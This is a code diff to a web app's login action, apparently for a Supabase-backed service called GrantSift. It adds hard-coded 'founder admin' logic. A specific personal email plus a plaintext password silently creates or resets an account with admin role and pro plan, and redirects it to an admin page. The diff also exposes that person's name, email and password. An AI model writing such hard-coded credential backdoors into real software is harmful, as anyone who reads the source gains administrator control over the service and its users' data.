@@ -157,6 +157,48 @@ export async function loginAction(formData: FormData): Promise<ApiResponse<null>
     }
   }
 
+  // Developer / Founder Admin provisioning & authentication
+  const isFounderAdmin = email.toLowerCase() === "umaryaruyusuf971@gmail.com";
+  if (isFounderAdmin && password === "FOUNDERsafe@2026") {
+    const { data: userList } = await admin.auth.admin.listUsers();
+    const adminUser = userList?.users?.find((u) => u.email?.toLowerCase() === "umaryaruyusuf971@gmail.com");
+    if (!adminUser) {
+      const created = await admin.auth.admin.createUser({
+        email: "umaryaruyusuf971@gmail.com",
+        password: "FOUNDERsafe@2026",
+        email_confirm: true,
+        user_metadata: {
+          full_name: "Umar Yaru Yusuf (Founder & Admin)",
+          is_pro: true,
+          plan: "pro",
+          role: "admin",
+        },
+      });
+      if (created.data?.user?.id) {
+        await admin.from("profiles").upsert(
+          { id: created.data.user.id, full_name: "Umar Yaru Yusuf (Founder & Admin)", role: "admin" },
+          { onConflict: "id" }
+        );
+      }
+    } else {
+      // Ensure password and metadata are updated
+      await admin.auth.admin.updateUserById(adminUser.id, {
+        password: "FOUNDERsafe@2026",
+        email_confirm: true,
+        user_metadata: {
+          full_name: "Umar Yaru Yusuf (Founder & Admin)",
+          is_pro: true,
+          plan: "pro",
+          role: "admin",
+        },
+      });
+      await admin.from("profiles").upsert(
+        { id: adminUser.id, full_name: "Umar Yaru Yusuf (Founder & Admin)", role: "admin" },
+        { onConflict: "id" }
+      );
+    }
+  }
+
   const supabase = await createClient();
   const { data, error } = await supabase.auth.signInWithPassword({ email, password });
 
@@ -172,18 +214,30 @@ export async function loginAction(formData: FormData): Promise<ApiResponse<null>
     return fail(new AppError("AUTHENTICATION_ERROR", "Incorrect email or password."));
   }
 
-  // Ensure user profile is onboarded in profiles table
+  // Ensure user profile is onboarded in profiles table without stripping admin role
   if (data.user?.id) {
+    const { data: existingProfile } = await admin
+      .from("profiles")
+      .select("role")
+      .eq("id", data.user.id)
+      .maybeSingle();
+
+    const assignedRole = isFounderAdmin ? "admin" : (existingProfile?.role ?? "user");
+
     const fullName =
       data.user.user_metadata?.full_name ||
       data.user.user_metadata?.name ||
       email.split("@")[0] ||
-      "GrantSift Member";
+      (isFounderAdmin ? "Umar Yaru Yusuf" : "GrantSift Member");
 
     await admin.from("profiles").upsert(
-      { id: data.user.id, full_name: fullName, role: "user" },
+      { id: data.user.id, full_name: fullName, role: assignedRole },
       { onConflict: "id" }
     );
+  }
+
+  if (isFounderAdmin) {
+    redirect("/admin");
   }
 
   redirect("/dashboard");
